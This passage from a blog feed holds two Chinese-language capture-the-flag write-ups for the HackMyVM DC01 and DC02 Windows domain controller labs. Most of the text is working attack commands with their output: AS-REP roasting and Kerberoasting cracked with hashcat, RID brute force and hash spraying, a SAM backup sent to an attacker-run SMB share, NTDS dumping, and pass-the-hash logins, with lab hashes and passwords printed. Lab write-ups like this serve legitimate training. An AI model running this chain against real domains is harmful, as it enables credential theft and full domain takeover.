<br>在这之前需要先将时间与域时间对齐<br>timedatectl set-ntp off
rdate -n  192.168.56.126
impacket-GetNPUsers  SOUPEDECODE.LOCAL/  -dc-ip 192.168.56.126 -no-pass -usersfile domain\_users.txt | grep -v  '[-]'
<br>impacket-GetNPUsers  SOUPEDECODE.LOCAL/  -dc-ip 192.168.56.126 -no-pass -usersfile domain\_users.txt | grep -v  '[-]'

$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:9db51e4c05b23c0562b08157315f848a$f5b6d13bb1d2dcd2c0f56218183d0c552a69ccde25bea3b39dc4f82002b6a42d05b8753a81230a65f62f6b091be00057d2a2d106a9d9c4e3ac99a70b3071cd822bb3536bf51cb9f94b3b7217594b2fff7baf7a4b195651753b7c9b87148f424f9255eafea3565df4dde77b2abeaa649f4b2b6877044936c66419aec3db1b4a4e066df447176c63f01de9a9ef41b8b846f3ba870a4237e50560dbbeb84d4b0f82afca660940e70ac6693bf7c82ffcba601384a110498dd4b7e5f7b4ca761830c8ff04b18dea82abf62c62bd00ab9948561b4ff09daf864b94745170d4239da474d8d016f72bb84ec0efa4147dc7eb6e4c327b8e9b0308
<br><br>我们获取到zximena448用户的 AS-REP 响应的加密密码哈希<br>它包含了目标用户的 Kerberos 密码<br>我们可以尝试利用hashcat对其进行破解以获取用户密码<br>hashcat -a 0 -m 18200 as-rep.txt rockyou.txt
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.002.png" referrerpolicy="no-referrer"><br>成功爆破出密码internet<br><br>利用zximena448用户与密码 收集域内信息<br>在这之前，我们要先用 dnschef 设置一个虚假的 DNS 服务器并运行 Bloodhound，然后在运行 BloodHound 时让它使用假的 DNS 服务器 IP 进行域名解析。这样可以帮我们获取更多的信息<br>dnschef --fakeip 192.168.56.126
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.003.png" referrerpolicy="no-referrer"><br>收集域内信息<br>bloodhound-python  -u 'zximena448' -p 'internet' -ns 127.0.0.1 -d SOUPEDECODE.LOCAL  -dc DC01.SOUPEDECODE.LOCAL   --zip
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.004.png" referrerpolicy="no-referrer"><br> 启动neo4j  然后用Bloodhood GUI 对获取的压缩包进行分析<br>上传压缩包里面的json文件<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.005.png" referrerpolicy="no-referrer"><br>找到我们当前的用户zximena448<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.006.png" referrerpolicy="no-referrer"><br>我们可以发现zximena448用户是backup operator 组的成员。<br>此组可以备份存储凭据的 SAM 数据库。但由于该用户无法登录  DC01，我们用 Impacket 工具远程备份此数据库。我们需要先启动一个 SMB 服务器，然后将SAM数据库备份从服务器上传到我们的攻击机。<br><br>在当前目录启动一个 SMB 服务器 并挂到后台<br>impacket-smbserver -smb2support share . &amp;
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[\*] Config file parsed
[\*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[\*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[\*] Config file parsed
[\*] Config file parsed
[\*] Config file parsed
<br>设置 SMB 服务器后，我们利用impacket-reg 工具远程备份SAM注册表项。<br>impacket-reg -dc-ip 192.168.56.126 SOUPEDECODE.LOCAL/zximena448:internet@192.168.56.126  backup -o '\\192.168.56.6\share' 
<br>然后使用impacket-secretsdump 转储这个SAM备份的内容<br>impacket-secretsdump -sam SAM.save  -system SYSTEM.save -security SECURITY.save LOCAL 

Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[\*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[\*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[\*] Dumping cached domain logon information (domain/username:hash)
[\*] Dumping LSA Secrets
[\*] $MACHINE.ACC
$MACHINE.ACC:plain\_password\_hex:30d0ca9ed25597562013a17fe07bcc24a8063aa89da83698090451d4f9c01497d07956aee9f517760560ca9817836b8aaa5a0706c8e3d358c8248d48c5c42388c80af03a4c70c4e75a55066bbc2ea68747c758fe4e41e80a4a6a2d9c9bd68c94ebc3e8fbbc89d06985163c8de5071d80a1c55c33a83b3c006c123eae6c0e5706412271e110ae7fd8e39482ae539bb6f9441b2340dbcd8fb1593198b778f09317469e8dd572d14e42031997298f68ec498f5bb6a2c295cd7c9dbadfcb88f74e7e0cb5b25b39ca43d970cb8c1b5b506c316438d7de4c8d0d6b1ac2f2985ef7eb35e0951cff704cae50ac45eff772a29f9e
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:f984aa0aa19fcb118d6b20506ce75c6d
[\*] DPAPI\_SYSTEM
dpapi\_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi\_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[\*] NL$KM
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU&gt;...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[\*] Cleaning up...
<br>发现这里面有Administrator用户的hash<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
<br>尝试能不能使用这个hash进行登录<br>crackmapexec smb DC01.SOUPEDECODE.LOCAL -u 'Administrator' -H 209c6174da490caeb422f3fa5a7ae634
SMB         SOUPEDECODE.LOCAL 445    DC01             [\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:209c6174da490caeb422f3fa5a7ae634 STATUS\_LOGON\_FAILURE
<br>登录失败了<br>没关系我们还有机器账户的hash ($MACHINE.ACC)<br>$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:f984aa0aa19fcb118d6b20506ce75c6d
<br><br>进行密码喷射之前，我们还需要获取目标的所有机器账户列表<br>我们可以利用Bloodhood收集的压缩包里面的computer.json文件获取<br>unzip 20241120140128\_bloodhound.zip
cat 20241120140128\_computers.json | jq .  | grep samaccountname | cut -d '"' -f4 &gt; machines.txt
<br>使用 CrackMapExec 进行密码喷射<br>crackmapexec smb DC01.SOUPEDECODE.LOCAL -u machines.txt  -H f984aa0aa19fcb118d6b20506ce75c6d | grep -v '[-]'
SMB         SOUPEDECODE.LOCAL 445    DC01             [\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\DC01$:f984aa0aa19fcb118d6b20506ce75c6d
<br><br>通过密码喷射 我们知道了这个hash是机器账户DC01$的<br>利用bloodhood GUI 对DC01$进行分析<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.006.png" referrerpolicy="no-referrer"><br>可以看到DC01$ 是 Administrator 组的成员，我们可以使用此组成员身份权限对域控制器执行 DCSync 攻击。<br>
在Enterprise Admin 组 也可以进行DCSync攻击能够执行能够执行 replication synchronization 权限 也可以
<br>crackmapexec smb DC01.SOUPEDECODE.LOCAL -u 'DC01$' -H f984aa0aa19fcb118d6b20506ce75c6d --ntds &gt;ntds.txt  
<br>--ntds  获取NTDS.dit 文件的内容这个文件是 Windows 域控的 Active Directory 数据库，包含了所有域账户的信息，包括密码哈希、Kerberos 密钥等敏感信息<br>管理员的hash<br>Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
<br><br>我们已经转储了域中所有用户的凭证。利用管理员的哈希值通过 WinRm 在本地登录到域控获取flag<br>evil-winrm -i 192.168.56.126 -u Administrator -H 8982babd4da89d33210779a6c5b078bd 
<br>\*Evil-WinRM\* PS C:\Users\Administrator\Documents&gt; type C:\Users\zximena448\Desktop\user.txt
2fe79eb0e02ecd4dd2833cfcbbdb504c

\*Evil-WinRM\* PS C:\Users\Administrator\Documents&gt; type C:\Users\Administrator\Desktop\root.txt
d41d8cd98f00b204e9800998ecf8427e
<br>参考wp:<a rel="noopener nofollow" class="external-link" href="https://christelise.github.io/posts/dc02-walkthrough/" target="_blank">https://christelise.github.io/posts/dc02-walkthrough/</a>]]></description><link>https://www.c1trus.top/24-渗透/hmv/21.dc02.html</link><guid isPermaLink="false">24-渗透/HMV/21.DC02.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/21.DC02.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[20.DC01]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>
<br><a data-tooltip-position="top" aria-label="3. SMB" data-href="#3. SMB" href="https://www.c1trus.top/about:blank#3._SMB" class="internal-link" target="_self" rel="noopener nofollow">3. SMB</a>
<br><a data-tooltip-position="top" aria-label="4. SMB密码喷射" data-href="#4. SMB密码喷射" href="https://www.c1trus.top/about:blank#4._SMB密码喷射" class="internal-link" target="_self" rel="noopener nofollow">4. SMB密码喷射</a>
<br><a data-tooltip-position="top" aria-label="5. hashcat破解" data-href="#5. hashcat破解" href="https://www.c1trus.top/about:blank#5._hashcat破解" class="internal-link" target="_self" rel="noopener nofollow">5. hashcat破解</a>
<br><a data-tooltip-position="top" aria-label="6. smb检测一下" data-href="#6. smb检测一下" href="https://www.c1trus.top/about:blank#6._smb检测一下" class="internal-link" target="_self" rel="noopener nofollow">6. smb检测一下</a>
<br><a data-tooltip-position="top" aria-label="7. smbclient连接" data-href="#7. smbclient连接" href="https://www.c1trus.top/about:blank#7._smbclient连接" class="internal-link" target="_self" rel="noopener nofollow">7. smbclient连接</a>
<br><a data-tooltip-position="top" aria-label="8. WinRM 连接DC01" data-href="#8. WinRM 连接DC01" href="https://www.c1trus.top/about:blank#8._WinRM_连接DC01" class="internal-link" target="_self" rel="noopener nofollow">8. WinRM 连接DC01</a>
<br>靶机链接：https://hackmyvm.eu/machines/machine.php?vm=DC01
<br><a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=josemlwdf" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=josemlwdf" target="_blank">josemlwdf</a><br>难度：⭐️⭐️⭐️⭐️
<br>知识点：SMB匿名登录、RID枚举、SPN
<br>好久没打windwos靶机了。这是我在hackmyvm上打的第一个windows靶机
<br><br>192.168.56.128:445 open
192.168.56.128:88 open
192.168.56.128:139 open
192.168.56.128:135 open
[\*] alive ports len is: 4
start vulscan
[\*] NetBios 192.168.56.128  [+] DC:SOUPEDECODE\DC01
[\*] NetInfo
[\*]192.168.56.128
   [-&gt;]DC01
   [-&gt;]192.168.56.128
<br>nmap -sC -sV 192.168.56.128 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-19 13:03 CST
Nmap scan report for 192.168.56.128
Host is up (0.00030s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-19 20:05:09Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|\_http-title: Not Found
|\_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn\_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:08:32:AA (Oracle VirtualBox virtual NIC)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|\_    Message signing enabled and required
|\_nbstat: NetBIOS name: DC01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:08:32:aa (Oracle VirtualBox virtual NIC)
| smb2-time:
|   date: 2024-11-19T20:05:57
|\_  start\_date: N/A
|\_clock-skew: 14h59m58s
<br>可以发现目标运行的服务有Kerberos、LDAP、SMB 这些都是windows域控的特征<br>域名 SOUPEDECODE 
<br>先把域名配置进/etc/hosts<br>192.168.56.128 SOUPEDECODE.LOCAL DC01.SOUPEDECODE.LOCAL
<br><br>作者开放了139 445端口，很明显的SMB特征<br>利用smbmap 枚举SMB服务 检测是否存在匿名登录或者来宾登录<br>smbmap -u anonymous -H SOUPEDECODE.LOCAL

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   /"       )|"  \    /"  ||   \_  "\ |"  \    /"  |     /""\       |   \_\_ "\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /" \   :) |.  \    /:  ||: |\_)  :)|.  \    /:  | /   /  \   \  /|\_\_/ \
  (\_\_\_\_\_\_\_/  |\_\_\_|\\_\_/|\_\_\_|(\_\_\_\_\_\_\_/ |\_\_\_|\\_\_/|\_\_\_|(\_\_\_/    \\_\_\_)(\_\_\_\_\_\_\_)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[\*] Detected 1 hosts serving SMB
[\*] Established 1 SMB session(s)
                                                                                              
[+] IP: 192.168.56.128:445      Name: soupedcode.loacl          Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        backup                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        SYSVOL                                                  NO ACCESS       Logon server share
        Users                                                   NO ACCESS
<br>发现 IPC$  是可以读取的<br>发现是可以匿名登录的，我们可以利用这个用户 进行相对标识符（RID）暴力枚举出域内的其他用户<br>crackmapexec smb SOUPEDECODE.LOCAL -u 'anonymous' -p '' --rid-brute &gt; rid_bruteforce.txt

cat rid\_bruteforce.txt | grep SidTypeUser | cut -d '\' -f2 | cut -d ' ' -f1 &gt; valid\_users.txt
<br>通过rid枚举 获取了1000多个用户名<br>ASREPRoasting 攻击<br>我们可以利用这些用户进行ASREPRoasting 攻击，但是都失败了。因为所有这些帐户都设置了 Kerberos 预身份验证所需的属性<br><br>┌──(root㉿kali)-[/home/kali/hmv/DC01]
└─# crackmapexec smb SOUPEDECODE.LOCAL -u valid\_users.txt -p valid\_users.txt  --no-bruteforce
SMB         SOUPEDECODE.LOCAL 445    DC01             [\*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\Guest:Guest STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\krbtgt:krbtgt STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\DC01$:DC01$ STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\bmark0:bmark0 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\otara1:otara1 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\kleo2:kleo2 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\eyara3:eyara3 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\pquinn4:pquinn4 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\jharper5:jharper5 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\bxenia6:bxenia6 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\gmona7:gmona7 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\oaaron8:oaaron8 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\pleo9:pleo9 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\evictor10:evictor10 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\wreed11:wreed11 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\bgavin12:bgavin12 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\ndelia13:ndelia13 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\akevin14:akevin14 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\kxenia15:kxenia15 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\ycody16:ycody16 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\qnora17:qnora17 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\dyvonne18:dyvonne18 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\qxenia19:qxenia19 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\rreed20:rreed20 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\icody21:icody21 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\ftom22:ftom22 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\ijake23:ijake23 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\rpenny24:rpenny24 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\jiris25:jiris25 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\colivia26:colivia26 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\pyvonne27:pyvonne27 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [-] SOUPEDECODE.LOCAL\zfrank28:zfrank28 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE.LOCAL 445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317
<br>成功获取到了一对用户密码<br>ybob317:ybob317
<br>枚举 Kerberos 服务主体名称（SPNs）<br>利用impacket-GetUserSPNs 枚举用户的服务帐户信息，然后使用这些 SPN 获取 Kerberos 服务票证（TGT），借助TGT我们可以向TGS请求获取TGS 并访问对应的服务<br>在枚举这些账户之前，我们需要先将攻击机的时间与域控的时间同步，不然会连接失败<br>timedatectl set-ntp off
rdate -n  192.168.56.128
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317 -dc-ip 192.168.56.128 -usersfile valid\_users.txt -request -outputfile spn-users.tgs
<br><img alt="20.DC01.001" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.001.png" referrerpolicy="no-referrer"><br><br>获取到了目标上服务账户的TGS后可以利用hashcat进行爆破<br>hashcat -a 0 -m 13100 spn-users.tgs /usr/share/wordlists/rockyou.txt  

$krb5tgs$23$\*file\_svc$SOUPEDECODE.LOCAL$file\_svc\*$819b74fc74d654f64b4ffc                           d59fcaffa8$1b2935d454f2797b08b5e5e3b1c9e093b5982e38edfb66c99f2264bcfa472                           84eaccdebc1bd926bde0a24db8ff34869da0d52fdfcaca2fea7e6c3b5476b5c4e231c842                           616b12bf97e643c060983421dd1cf6f358f0569f4214516f0eec01111e543b0035a5dc28                           332619c22e939a86e5a08fa586f06aa8e2c3c553d79057cfde0f60e99a072ee8edbee941                           2043b665fb117284513fb9c78b212af0d8447c6f96ff2cd75e921fda971125a358ac5029                           35ad8f451ef5a441514b331e41196310c20235f38849402bb94d4d7e505d249a3d961a1d                           fecb3e11f7fc395ec3a4d49fb67d44a0c56b46a8bbea697b766bc493b1de8c79428efae7                           1ef27b1ac43ebc85be78d2829dcd0700b09333bfe841a458c90fbba29bd2d997e7b8a5c6                           174104985675bd8e6b78241ee114b15f5e57b66e35467aa89d827cae400c0cf7618acae7                           909eaf536dc1e5cceadb028c5113e269d4de9c75703cc3e8c71883a981a233d7564715b2                           7982284f3943da002846358961d7fb54de55b90ab02f41f0a357a083721601fc7a655815                           a8cc6d20024639be7e610b7fe65969c06ea6efa388e203821c3480605be47e37c44226fc                           dabcec441cf0bfca7e7d99ffdc5ca0a28b8d0c6dd99fa55209dbec51eebd49faeebb1d80                           1efda2c78f966e63767c541cee0d017581770e9780d0316e0173382e6774f95e00b3dda7                           d0eb05f7766b1f76726eb26395561cd9c2d55af8057cc35bfb7b2468006d80ab8c2b68ef                           0281659e598f117bf0d2a57179d4e203256374e1dbb20dfaafd40316c508fc88ac2ccb53                           658ec19d6439f5a2956fc76e24ad09b4ecd452022758f79a0a0878c60e21ceb0059a22dc                           f5965012e9e9a0dab3222180880e0f5da3c0aaddb76587a7452ce2a37b21d7f68d097ef7                           8b25fab43f43d60c59c2b48c9c8542e9c05099ff1a59c66c66731915e3ceddb579ee2dca                           663270904eec929004bb6b9081a37ceb9d6848fed0ce388721ceafe05175a8564b262c04                           3244f90d01d9a51c3291fe4f16091b80ddf883e14e4f2531afb77d25a41f18cbb2b30de0                           f9ecd778821ecb2526041398178b3b58ac0057d0ebba808d6845a4353fdbcd012d9a0887                           4f7e4c24c1ad40cf2c65b053bc056a1479fbc1cb84140c34ec1ead95dd5555794c3c1c66                           57b2b8f5c4f47b2fbd0889dac1ae71dc8f8abdd1ac9ae13d9e2b1192d191811bb6a38f31                           62ea4baf2322b1b38cd6bbf6662c6920a2c71d6e72ac0686cd2aecc7f9f54b499b194f7f                           6ee8ca01f792ff0a784641ea5efed8c0940314efc87fbcdb997e311cc48e95f766d2c6a3                           25ece96089d7ca723195f9ff8812cb807d039d4345ba7def5903ed5d19f995f1720fe3e6                           a3709d01977f086f0fe351e9a767d5ccbc2e9b92bb29715ab0edc32cb800decdbcdf9977                           e3558992782afdd7e56b65e703e1360117af01e8c96149ad27525f9b45b62b0b4a6ea407                           c0a4162789879307cfd7e6cd62ccf01e8ff73:Password123!!
<br>成功获取到了file_svc用户的密码<br>file\_svc：Password123!!
<br>看这个名字就知道与文件服务相关<br><br>crackmapexec smb SOUPEDECODE.LOCAL -u file\_svc -p 'Password123!!' --shares
<br><img alt="20.DC01.002" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.002.png" referrerpolicy="no-referrer"><br>可以发现里面有一个backup 共享<br><br>smbclient -U 'filesvc' //SOUPEDECODE.LOCAL/backup
Password for [WORKGROUP\file\_svc]:
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Tue Jun 18 01:41:17 2024
  ..                                 DR        0  Tue Jun 18 01:44:56 2024
  backup\_extract.txt                  A      892  Mon Jun 17 16:41:05 2024

                12942591 blocks of size 4096. 10958701 blocks available
smb: \&gt; ls -la
NT\_STATUS\_NO\_SUCH\_FILE listing \-la
smb: \&gt; dir -a
NT\_STATUS\_NO\_SUCH\_FILE listing \-a
smb: \&gt; ls -a
NT\_STATUS\_NO\_SUCH\_FILE listing \-a
smb: \&gt; ls
  .                                   D        0  Tue Jun 18 01:41:17 2024
  ..                                 DR        0  Tue Jun 18 01:44:56 2024
  backup\_extract.txt                  A      892  Mon Jun 17 16:41:05 2024

                12942591 blocks of size 4096. 10958701 blocks available
smb: \&gt; get backup\_extract.txt
getting file \backup\_extract.txt of size 892 as backup\_extract.txt (58.1 KiloBytes/sec) (average 58.1 KiloBytes/sec)
smb: \&gt; exit
<br>cat backup\_extract.txt
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
<br>获取到了一些目标服务账户的NTLM 密码哈希值，利用这些hash搭配前面的用户名单进行枚举，检查是否出现任何重复使用的密码<br>Warning
在实际渗透测试中，根据环境中的帐户锁定策略限制密码喷射尝试的次数至关重要。这种预防措施有助于防止敏感账户被意外锁定，这可能会干扰我们客户的运营。
<br>cat backup\_extract.txt | cut -d '￥' -f1 &gt; names.txt
cat backup\_extract.txt | cut -d ':' -f4 &gt; hashes.txt
crackmapexec smb SOUPEDECODE.LOCAL -u valid\_users.txt  -H hashes.txt | grep -v '[-]'

<br><img alt="20.DC01.003" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/20.DC01.003.png" referrerpolicy="no-referrer"><br>成功枚举出FileServer$ 用户，这表示我们可以通过这个用户连接到DC01，因为DC对这个用户托管了共享的权限，所以说肯定是可以连接DC01的<br><br>evil-winrm -i 192.168.56.128 -u "FileServer$" -H e41da7e79a4c76dbd9cf79d1cb325559
